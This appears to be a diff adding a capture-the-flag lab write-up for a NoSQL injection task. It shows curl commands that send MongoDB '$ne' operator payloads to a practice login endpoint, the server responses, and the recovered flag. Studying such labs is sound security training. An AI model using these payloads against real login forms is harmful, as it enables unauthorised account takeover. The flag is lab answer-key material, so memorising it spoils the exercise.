@@ -877,3 +877,161 @@ git commit -m "5-vuln.txt"
 git push
 ```
 
+
+## Task 6. NoSQLi - Bypassing Login via injection
+
+The application you are targeting uses a NoSQL database for user authentication.\
+Due to improper input handling, it's possible to manipulate the login query through injection.\
+By crafting a specific payload, you can alter the query logic to bypass authentication checks and log in as any user, including administrative accounts.
+
+Your challenge is to find the `flag` ⛳️ by exploiting a login form.
+
+- Target URL: `http://web0x01.hbtn/a3/nosql_injection`
+
+---
+
+Helpful Instructions:
+
+1. Experiment with injecting JSON-like syntax into the username and password fields.
+2. Focus on operators that can modify the logic of the database query, such as `$ne` (not equal).
+3. Consider using the `$ne` operator with a value that is always true, such as `{"$ne": null}` or `{"$ne": ""}`, to manipulate query conditions.
+4. Try to target specific users by injecting payloads into the username field. Use common usernames like `admin` to attempt gaining administrative access.
+5. Observe how the application responds to different payloads. Successful bypass might not always be obvious and could require interpreting subtle changes in response behavior or content.&#x20;
+
+\*
+
+
+## **Solution**:
+
+We already discovered the login endpoint in Task 5:
+
+```
+POST /api/a3/nosql_injection/sign_in
+```
+
+### Attempt authentication bypass with `$ne`
+
+Normally, authentication might use a MongoDB query resembling:
+
+```mongodb
+db.users.findOne({
+  username: req.body.username,
+  password: req.body.password
+})
+```
+
+We want to log in as `admin` without knowing the password.
+
+We'll try this JSON payload:
+
+```
+{
+  "username": "admin",
+  "password": {"$ne": null}
+}
+```
+
+The `$ne` operator means not equal. If the backend passes this object directly into MongoDB, it could match an administrative account whose password is not `null`.
+
+### Execute this command
+
+```bash
+curl -sS -i -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/sign_in' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":{"$ne":null}}'
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 26 Oct 2026 21:37:54 GMT
+# Content-Type: application/json
+# Content-Length: 73
+# Connection: keep-alive
+# Vary: Cookie
+# Set-Cookie: session=PHYVAYgFIAtkCftyP5Qm6HyNWvVsA285nNqdKCGBVqw._qVjgH1kvndIhvm6Z5yoP-LEXIw; HttpOnly; Path=/
+# X-XSS-Protection: 0
+#
+# {
+#     "status": "error",
+#     "message": "Invalid Credentials Provided."
+# }
+```
+
+### What we're looking for
+
+- Authentication successful: The backend likely interpreted `$ne` as a MongoDB operator, bypassing password verification.
+- **Unauthorized**: Either `admin` doesn't exist, the password operator isn't accepted, or the query is protected.
+- Error: The backend may reveal useful information about how it processes authentication inputs.
+
+The `-i` flag includes the HTTP response headers, which can also reveal whether a session cookie was issued.
+
+
+The request reached the server, but authentication failed:
+
+```
+{
+  "status": "error",
+  "message": "Invalid Credentials Provided."
+}
+```
+
+The HTTP `200 OK` only means the server processed the request. It doesn't mean login succeeded.
+
+### Inject both username and password
+
+Our previous attempt assumed an account named `admin` existed.
+
+This time, we'll use `$ne` on both fields:
+
+```
+{
+  "username": {"$ne": null},
+  "password": {"$ne": null}
+}
+```
+
+If the application passes these objects directly into a MongoDB authentication query, the conditions could match any account with non-null username and password fields.
+
+Executing this single command:
+
+```bash
+curl -sS -i -X POST \
+  'http://web0x01.hbtn/api/a3/nosql_injection/sign_in' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 26 Oct 2026 21:42:36 GMT
+# Content-Type: application/json
+# Content-Length: 119
+# Connection: keep-alive
+# Vary: Cookie
+# Set-Cookie: session=KLFPJdNP4Zuf80lzebVHXDI7jjZScKLvCrkW-yyYvAA.# tgVcMSsepyCgu0y65GMfUavMyYk; HttpOnly; Path=/
+# X-XSS-Protection: 0
+#
+# {
+#     "status": "success",
+#     "message": "Congratulations For your Sign in!\nFLAG: 85ce687f6f297f4544dff20a24493751"
+# }
+```
+
+If the backend uses something like:
+
+```
+db.users.findOne({
+  username: {"$ne": null},
+  password: {"$ne": null}
+})
+```
+
+it returns the first matching user without validating their actual password.
+
+save the flag:
+
+```bash
+echo "85ce687f6f297f4544dff20a24493751" > 6-flag.txt
+git add .
+git commit -m "6-flag.txt"
+git push
+```
+
